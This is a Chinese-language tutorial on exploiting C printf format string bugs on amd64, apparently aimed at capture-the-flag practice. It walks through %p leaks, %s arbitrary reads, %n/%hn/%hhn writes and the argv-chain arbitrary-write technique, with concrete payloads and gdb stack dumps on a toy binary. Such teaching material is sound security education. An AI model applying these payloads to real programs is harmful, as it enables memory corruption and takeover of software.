# Format String

format string 是在使用 printf 上的一個漏洞，基本上好像只會在打題目的時候出現 XD

以下是經典的 format string 範例

```C
char buf[50];
scanf("%s", buf);
printf(buf);
```

原本應該由開發者填寫的 format 變成使用者可控的，可以藉由這樣的漏洞達到任意讀取及任意寫入的操作

## printf 參數

一開始要先講的是 `printf` 的參數，在 `amd64` 的情況下，如果參數沒有超過 6 個的話會放在 register 上，第 7 個開始才放在 stack 上

`rdi`→`rsi` → `rdx` → `rcx` → `r8` → `r9` → `stack`

正常使用 `printf` 時：

```C
printf("%d%c%s", a,  b,  c);
          |      |   |   |
         rdi    rsi rdx rcx
```

在使用 fromat string 時，`rdi` 是自己的 payload，而第一個 `%` 代表的是 `rsi`，如果想要動到 stack 上的東西就要從第 6 個 `%` 開始

### 直接指定參數

可以使用 `%x$y` 直接指定第幾個參數，這邊的 `x` 是第幾個參數，`y` 則是要使用的方法

```c
%2$p          // 印出 rdx (第 2 個參數)
%3$n          // 寫入 rcx (第 3 個參數)
```

## 讀取

讀取的部分主要可以有 `%p` 以及 `%s` 兩種做法，`%p` 可以用來讀取 register 以及 stack 上的值，而 `%s` 則可以做到任意讀取

### %p

在讀取時使用的是 `%p` ，可以用 16 進位印出某個 register (stack 某位置) 存的值，以下來個範例

![](https://i.imgur.com/COSz0S8.png)

這邊輸入的 payload 是

```
%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
```

輸出如下

```
0x1,0x7ffff7dd3790,0xa,(nil),0x7ffff7fe9700,0x70252c70252c7025,0x252c70252c70252c,0x2c70252c70252c70,0x70252c70252c7025,0x252c70252c70252c,0x400070,0x7fffffffe940,0x7b74f8be5cadfe00,0x4006f0
 |         |        |    |         |               |                   |                   |                 |      
rsi       rdx      rcx  r8        r9              rsp              rsp + 0x8           rsp + 0x10        rsp + 0x18
```

假設想要印出 `rsp + 0x28` 的值也可以直接使用 `$` 來指定

```
%10$p -> 0x400070
```

### %s

`%s` 跟 `%p` 讀取的目標不一樣，`%s` 是把存的值當成指標去讀取，而 `%p` 是把存的值直接送出來

在正常使用 `%s` 時，放入的參數是某個字串的指標，`printf` 會把指標所指的地方當成字串印出

```c
char str[] = "Hello World!";
printf("%s", str);               // Hello World!
```

這種機制就可以用來任意讀取，假設輸入的 payload 在 stack 上的話，可以把想要印出的位址寫在 payload 上，接著使用 `%s` 去讀出來，以下是範例

![](https://i.imgur.com/5Kp4CMK.png)

這時候的輸入如下，`aaaa` 的部分是為了把要印的位址推到 `rsp + 0x8` ，這樣 `rsp + 0x8` 就會剛好是 `0x6262626262626262` ("bbbbbbbb")

```
%7$saaaabbbbbbbb
```

在執行 `printf` 時會去抓 `0x6262626262626262` 所存的值並當成字串印出，不過這次的範例沒有這個位址，所以會失敗

## 寫入

`printf` 使用 `%n` 時可以寫入指定的位置，也可以更近一步使用 argv chain 來達成任意位址寫入

`%n` 跟 `%s` 類似，一樣是把存的值當成指標，`%s` 將指標指的位置讀出來，而 `%n` 則是把數值寫入指標所指的位置

假設 stack 上的 `rsp + 0x10` 如下，用 `%8$n` 寫入這格時，實際上會寫到 `0x7ffff7fea000` 

```bash
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d000 --> 0x3010102464c457f
```

如果是寫 `0xdeadbeef` 的話，這段就會變成

```
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7fffdeadbeef
```

### 寫入的值

寫入的值是在遇到 `%n` 前總共印了幾個字元

例如 payload 如下，`%n` 前有 8 個 `a` ，所以會寫 8 到指定的位置

```
aaaaaaaa%n
```

如果有多個 `%n` 的話就要看前面到底多長

例如 payload 如下，第一個 `%n` 前有 8 個 `a` ，會寫 8 到 `rsp` 指的位置，而第二個 `%n` 前有 8 個 `a` 以及 8 個 `b` ，共 16 字元，所以會寫 16 到 `rsp + 8` 所指的位置

```
aaaaaaaa%6$nbbbbbbbb%7$n
```

不過這樣寫入要打很久，這時候可以用到 `%c` 來構成 payload

先來看看 `%c` 的用法，可以直接指定要印出的長度

```C
// input
char ch = 'a'
printf("%3c");
printf("%5c");
// output
"  a"
"    a"
```

利用 `%c` 修改一下上面的範例，可以達成一樣的效果

```
%8c%6$n%8c%7$n
```

### 寫入的長度

上面雖然都用 `%n` 來舉例，但其實寫入可以指定不同的長度

| 格式 | 長度 (byte) |
| :--: | :---------: |
| %lln |   8 bytes   |
|  %n  |   4 bytes   |
| %hn  |   2 bytes   |
| %hhn |   1 byte    |

以一開始的例子來說

```bash
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d000 --> 0x3010102464c457f
```

寫 `aaaa%8$lln` 

```bash
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x4
```

 寫 `aaaa%8$n`

```bash
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7fff00000004
```

寫 `aaaa%8$hn`

```bash
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a00004
```

寫 `aaaa%8$hhn`

```bash
0016| 0x7fffffffdb88 --> 0x7ffff7fea000 --> 0x7ffff7a0d004
```

一般在使用的時候，通常不會一次寫入整段的資料，例如要寫入 `0xdeadbeef` 的話，就必須要一次寫 3735928559 個字元，需要跑超久的，因此會配合 argv chain 分成 `0xde`、`0xad`、`0xbe`、`0xef` 來多次寫入

### argv chain

argv chain 是利用 stack 上的 argv 來達成任意寫入的功能

stack 上都會有一段是 argv 的位置，argv chain 上的兩段位址都在 stack 上且可以控制

```bash
0000| 0x7fffffffe820 --> 0x333231 ('123')
0008| 0x7fffffffe828 --> 0x40073d (<__libc_csu_init+77>:	add    rbx,0x1)
0016| 0x7fffffffe830 --> 0x0
0024| 0x7fffffffe838 --> 0x0
0032| 0x7fffffffe840 --> 0x4006f0 (<__libc_csu_init>:	push   r15)
0040| 0x7fffffffe848 --> 0x400590 (<_start>:	xor    ebp,ebp)
0048| 0x7fffffffe850 --> 0x7fffffffe940 --> 0x1
0056| 0x7fffffffe858 --> 0xa0a688c62ba6ff00
0064| 0x7fffffffe860 --> 0x4006f0 (<__libc_csu_init>:	push   r15)
0072| 0x7fffffffe868 --> 0x7ffff7a2d830 (<__libc_start_main+240>:	mov    edi,eax)
0080| 0x7fffffffe870 --> 0x0
+------------------------------------------------------------------------------------------------------------------------------------------+
|0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80   ("/home/frozenkp/challenge/format/a.out")        |
+------------------------------------------------------------------------------------------------------------------------------------------+
0096| 0x7fffffffe880 --> 0x1f7ffcca0
0104| 0x7fffffffe888 --> 0x400686 (<main>:	push   rbp)
0112| 0x7fffffffe890 --> 0x0
0120| 0x7fffffffe898 --> 0xc5142c5f7392e1ee
```

```bash
0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0x72662f656d6f682f
              |                  |                  |
          rsp + 0x58         rsp + 0x128        rsp + 0x360
            argv0              argv1              argv2
```

可以透過寫入 argv1 來改動 argv2 寫的內容 (address)，最後再透過寫入 argv2 來寫入指定的位址

以下範例，假設要在 `0xdeadbeef` 寫入 `0x4`

#### 第一步：透過 argv1 寫 2 bytes

一開始先在 argv2 的值寫上 `0xef` ，payload 如下

```
%48879c%43$hn
```

寫完後如下

```bash
                                                                             +----+
0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0x72662f656d6f|beef|
                                                                             +----+
```

#### 第二步：透過 argv0 移動 2

把 argv2 移動 2，payload 如下

```
%2c%17$hhn
```

寫完後如下，argv2 從 `0x7fffffffeb80` 變成 `0x7fffffffeb82`

```bash
0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb82 --> 0x7a6f72662f656d6f
```

#### 第三步：透過 argv1 寫 2 bytes

原本只能寫上 `0xbeef` ，後面的部分透過第二步移動 argv2 以後就可以用 `%hn` 碰到了

因為剩下只要寫掉 `0xdead` 就好，所以我這邊直接使用 `%lln` 把後面都用 0 蓋掉

```
%57005c%43$lln
```

寫完後如下

```bash
                                                               +------+
0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb82 --> |0xdead|
                                                               +------+
```

#### 第四步：透過 argv0 移動回來

把 argv2 移動回來，payload 如下

```
%17$hhn
```

寫完後如下，分兩段寫後就可以把整個 `0xdeadbeef` 寫上去了

```bash
                                                               +----------+
0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> |0xdeadbeef|
                                                               +----------+
```

#### 第五步：透過 argv2 寫入 0xdeadbeef

這邊再寫入的時候，如果要寫得值太大，一樣要像前面一樣分成多段來寫，而這個範例只要寫入 `0x4` 所以就直接寫就好了

```
%4c%114$lln
```

寫完後，`0xdeadbeef` 存的值就會被改掉了

```bash
0088| 0x7fffffffe878 --> 0x7fffffffe948 --> 0x7fffffffeb80 --> 0xdeadbeef --> 0x4
```

> 這題範例為了講解方便，所以一次都寫 2 bytes，建議是一次寫 1 byte 用 for 迴圈自動移動完成即可

## _printf_chk

有時候會遇到使用的是 `_printf_chk` 而非 `printf`，其實這兩個差不多，只不過 `_printf_chk` 多了以下限制

- 不能用 `%n` 系列寫值
- 不能用 `%x$y` 指定參數